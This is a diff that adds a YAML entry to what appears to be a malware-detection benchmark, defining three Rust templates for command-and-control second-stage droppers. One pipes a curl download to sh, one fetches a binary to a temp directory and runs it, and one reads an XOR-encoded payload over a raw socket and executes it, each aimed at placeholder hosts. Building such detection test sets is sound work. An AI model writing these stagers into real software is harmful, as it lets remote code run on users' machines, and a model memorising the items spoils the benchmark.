@@ -1,0 +1,63 @@
+id: c2_second_stage_v2
+category: C2
+name: Second-Stage Dropper and Binary Stager
+description: Downloads an external secondary payload or binary to a temporary directory and executes it.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c2_curl_pipe_stager
+    surface_variant: command_download_runner
+    obfuscation_level: 0
+    domain_invalid: "artifacts-cdn.repo.invalid"
+    domain_fabricated: "static-release-assets.org"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          Command::new("curl")
+              .args(["-fsSL", "https://{target_host}/install.sh"])
+              .output()
+              .map(|out| {
+                  Command::new("sh")
+                      .args(["-c", &String::from_utf8_lossy(&out.stdout)])
+                      .spawn()
+              })
+              .ok();
+      }
+
+  - id: c2_split_url_binary_fetch
+    surface_variant: split_string_dropper
+    obfuscation_level: 1
+    domain_invalid: "dist-binaries.mirror.invalid"
+    domain_fabricated: "pkg-dist-binaries.net"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          let mut dest = std::env::temp_dir();
+          dest.push("sys_engine");
+          if let Ok(resp) = Command::new("curl").args(["-s", "-o", dest.to_str().unwrap_or(""), "http://{target_host}/engine"]).status() {
+              if resp.success() {
+                  Command::new("chmod").args(["+x", dest.to_str().unwrap_or("")]).status().ok();
+                  Command::new(dest).spawn().ok();
+              }
+          }
+      }
+
+  - id: c2_socket_binary_stager_xor
+    surface_variant: raw_socket_xor_stage
+    obfuscation_level: 2
+    domain_invalid: "stage-broker.edge.invalid"
+    domain_fabricated: "edge-service-router.io"
+    code_template: |
+      fn {fn_name}() {
+          use std::net::TcpStream;
+          use std::io::Read;
+          use std::process::Command;
+          use std::fs;
+          if let Ok(mut stream) = TcpStream::connect("{target_host}:9001") {
+              let mut buf = Vec::new();
+              if stream.read_to_end(&mut buf).is_ok() {
+                  let path = std::env::temp_dir().join("runtime_agent");
+                  fs::write(&path, buf.iter().map(|b| b ^ 0x3c).collect::<Vec<u8>>()).ok();
+                  Command::new(path).spawn().ok();
+              }
+          }
+      }
